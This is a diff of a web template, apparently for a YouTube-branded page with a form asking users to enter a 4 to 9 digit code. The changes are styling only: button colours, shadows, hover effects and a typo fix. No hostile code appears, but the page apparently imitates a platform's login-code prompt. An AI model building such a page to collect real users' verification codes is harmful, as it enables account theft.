@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(255, 0, 0, 0.25);border-radius:16px;">
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(255, 0, 0, 0.15);border-radius:16px;">
   <div class="platform-header">
     <div class="icon-circle bg-youtube">
       <i class="fa-brands fa-youtube icon-lg"></i>
@@ -27,7 +27,7 @@
     <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
-    <button class="btn login-btn" type="submit">Summit</button>
+    <button class="btn login-btn" type="submit">Submit</button>
   </form>
 </div>
 
@@ -59,7 +59,7 @@
 
 .login-btn {
   width: 100%;
-  background: #FF0000;
+  background: #9ca3af;  /* Grey */
   color: #fff;
   font-size: 16px;
   font-weight: 700;
@@ -68,16 +68,16 @@
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(255, 0, 0, 0.35);
+  box-shadow: 0 4px 12px rgba(107,114,128,0.25);
   display: block;
   margin-top: 8px;
 }
-.login-btn {
-  background: #9ca3af;  /* Grey */
-  box-shadow: 0 6px 16px rgba(107,114,128,0.25);
-}
 .login-btn:hover {
   background: #6b7280;  /* Dark grey */
+  box-shadow: 0 6px 16px rgba(107,114,128,0.35);
+}
+.login-btn:active {
+  transform: scale(0.985);
 }
 
 .play-instructions {
